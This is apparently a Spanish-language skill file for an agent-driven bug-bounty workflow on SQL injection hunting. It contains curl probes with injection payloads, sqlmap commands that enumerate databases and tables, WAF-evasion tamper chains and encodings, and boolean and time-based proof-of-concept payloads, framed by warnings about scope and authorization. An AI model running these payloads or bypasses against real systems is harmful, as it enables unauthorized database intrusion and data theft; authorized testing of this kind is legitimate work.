---
name: sqli-hunting
description: "SQL Injection hunting: detección con loxs/sqlmap, fingerprinting de DBMS, extracción controlada de PoC, bypass de WAF con tampers."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, sqli, injection, database, waf-bypass]
  tools: [sqlmap, loxs.py, curl]
  required: [curl]
  recommended: [sqlmap]
  related_skills: [loxs-scanner, xss-hunting, api-swagger-fuzz]
  stage: attack
---

# SQL Injection

## 1 — Detección masiva (bajo ruido)

```bash
# Loxs pass sobre URLs con params
python3 tools/loxs/loxs.py -l urls_params.txt -t sqli

# Confirmación manual con payloads por DBMS
# tools/loxs/payloads/sqli/{mysql,postgresql,mssql,oracle,generic}.txt
curl -s "https://target.com/item?id=1'" -o /dev/null -w "%{http_code}\n"
curl -s "https://target.com/item?id=1 AND 1=1" | md5sum   # misma respuesta que id=1
curl -s "https://target.com/item?id=1 AND 1=2" | md5sum   # diferente → boolean blind
```

## 2 — Confirmación con sqlmap (una vez candidato sólido)

```bash
# Nunca contra producción sin permiso explícito; usa --scope del programa
sqlmap -u "https://target.com/item?id=1" --batch --level 3 --risk 2 \
  --dbs --tables --banner --parse-errors

# endpoints POST/JSON
sqlmap -r request.txt --batch --level 2      # request.txt = Burp raw request

# WAF: tamper chains
sqlmap -u "https://target.com/item?id=1" --batch \
  --tamper=space2comment,between,randomcase,randomcomments

# probar todos los tampers bundled
ls /usr/share/sqlmap/tamper/
```

## 3 — Bypass manual de WAF (cuando sqlmap se bloquea)

- Doble encoding: `%2527` · Unicode: `%u0027` · Overlong UTF-8
- Commentos: `'/**/OR/**/1=1--` · `/*!50000OR*/`
- Case mix + whitespace alternativo: `%09`, `%0a`, `%0b`, `/**/`
- HTTP-level: cambia `User-Agent`, quita headers, usa method alternate (POST→GET)

## 4 — PoC mínimo para reporte (NO dumping de datos)

```sql
-- boolean blind demostrado
id=1 AND 1=1  → 200 OK
id=1 AND 1=2  → 500 / empty
-- time-based demostrado
id=1 AND SLEEP(5)  → respuesta tarda 5s+
```

Reporta: endpoint, parámetro, tipo (union/boolean/time/error), DBMS fingerprinteado, impacto (lectura de tablas de usuarios ⇒ PII). **No extraigas credenciales reales** — con el PoC de tiempo/boolean basta.

## Reglas

- `--risk 3` solo con autorización explícita ( puede ser destructivo).
- Respeta rate limiting; un SQLi masivo contra producción = ban del programa.
